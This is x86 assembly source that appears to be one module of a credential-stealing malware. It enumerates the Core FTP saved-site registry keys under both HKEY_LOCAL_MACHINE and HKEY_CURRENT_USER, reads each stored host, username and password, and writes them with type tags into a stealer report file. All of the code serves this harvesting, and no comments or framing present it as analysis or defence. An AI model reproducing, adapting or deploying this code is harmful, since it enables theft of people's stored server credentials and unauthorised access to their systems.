.data?
      core_host        db  200h dup (?)
      core_user        db  200h dup (?)
      core_pwd         db  200h dup (?)
      core_buf1        db  100h dup (?)
      core_buf2        db  100h dup (?)
     
.code

GetCoreFTPPwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], COREFTP_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetCoreFTPPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      push    HKEY_LOCAL_MACHINE
      call    GetCoreFTP
      
      push    HKEY_CURRENT_USER
      call    GetCoreFTP
      
    GetCoreFTPPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetCoreFTPPwd endp

GetCoreFTP proc hkey:DWORD
      LOCAL   coreKey :DWORD
      LOCAL   index :DWORD
      LOCAL   corebufsize :DWORD
      
      lea     eax, coreKey
      push    eax
      push    KEY_READ
      push    0
      push    offset coreftp_path1
      push    hkey
      call    dword ptr [_RegOpenKeyEx]
      test    eax, eax
      jne     coreftp_failed_1
      
      mov     dword ptr [index], 0
      
    coreftp_enum_loop:
      mov     corebufsize, sizeof core_buf1
      xor     eax, eax
      push    eax
      push    eax
      push    eax
      push    eax
      lea     eax, corebufsize
      push    eax
      push    offset core_buf1
      push    dword ptr [index]
      push    dword ptr [coreKey]
      call    dword ptr [_RegEnumKeyEx]
      cmp     eax, ERROR_NO_MORE_ITEMS
      je      all_coreftp_key_done
      inc     dword ptr [index]
      
      lstrcpy, addr core_buf2, addr coreftp_path1
      lstrcat, addr core_buf2, addr sl
      lstrcat, addr core_buf2, addr core_buf1
      
      ; Get Host
      mov     dword ptr [core_host], 0
      invoke  RegRead, hkey, addr core_buf2, addr coreftpReg1, addr core_host, sizeof core_host, REG_READ_W
      test    eax, eax
      je      coreftp_failed_2
      ; Get UserName
      mov     dword ptr [core_user], 0
      invoke  RegRead, hkey, addr core_buf2, addr coreftpReg2, addr core_user, sizeof core_user, REG_READ_W
      test    eax, eax
      je      coreftp_failed_2
      ; Get Pwd
      mov     dword ptr [core_pwd], 0
      invoke  RegRead, hkey, addr core_buf2, addr coreftpReg3, addr core_pwd, sizeof core_pwd, REG_READ_W
      test    eax, eax
      je      coreftp_failed_2
      
      lstrlenW, addr core_host
      imul    eax, eax, 2
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr core_host, plen, addr SNW, NULL
      
      lstrlenW, addr core_user
      imul    eax, eax, 2
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr core_user, plen, addr SNW, NULL
      
      lstrlenW, addr core_pwd
      imul    eax, eax, 2
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr core_pwd, plen, addr SNW, NULL
      
    coreftp_failed_2:
      jmp     coreftp_enum_loop
    all_coreftp_key_done:
      push    dword ptr [coreKey]
      call    dword ptr [_RegCloseKey]
    coreftp_failed_1:
      ret
GetCoreFTP endp
